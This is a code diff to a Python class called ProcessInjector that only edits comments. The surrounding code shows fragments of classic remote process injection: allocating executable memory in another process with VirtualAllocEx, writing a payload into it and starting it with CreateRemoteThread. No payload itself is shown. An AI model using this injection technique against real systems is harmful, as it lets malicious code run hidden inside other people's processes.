@@ -42,7 +42,7 @@ class ProcessInjector:
             return self
 
     def __exit__(self, exception_type, exception_value, exeception_traceback):
-        self.kern32.CloseHandle(self.proc_handle)
+        self.kern32.CloseHandle(self.proc_handle) # Closing process handle with `CloseHandle`
         if exception_type:
             print(exception_value)
             exit(1)
@@ -55,9 +55,9 @@ class ProcessInjector:
         self.alloc_mem_base_addr = self.kern32.VirtualAllocEx(
             self.proc_handle,       # Process handle
             0,                      # Let function determine where to allocate the memory
-            payload_size,           # size of payload
+            payload_size,           # Size of payload
             MEM_COMMIT,             # Commit the region of virtual memory pages we created
-            PAGE_EXECUTE_READWRITE) # set read, write, and execute permissions to allocated memory
+            PAGE_EXECUTE_READWRITE) # Set read, write, and execute permissions to allocated memory
         if not self.alloc_mem_base_addr:
             raise Exception(f"[-] Could not allocate memory in the target process: {self.pid}")
         else:
@@ -72,15 +72,15 @@ class ProcessInjector:
             self.alloc_mem_base_addr, # Base address returned by `VirtualAllocEx`
             lp_buffer,                # The data we want to write into the allocated memory
             n_size,                   # The amount of data from our buffer we wish to write
-            num_bytes_written)        # the number of bytes written
+            num_bytes_written)        # The number of bytes written
     
     def create_remote_thread(self):
         self.kern32.CreateRemoteThread(
             self.proc_handle,         # Process handle
-            None,                     # set default security descriptor 
-            0,                        # use default size of executable
+            None,                     # Set default security descriptor 
+            0,                        # Use default size of executable
             self.alloc_mem_base_addr, # Base address returned by `VirtualAllocEx`
-            0,                        # ignore lpParamter
-            0,                        # run thread immediately after creation
-            0)                        # ignore thread identifier
+            0,                        # Ignore lpParamter
+            0,                        # Run thread immediately after creation
+            0)                        # Ignore thread identifier
         
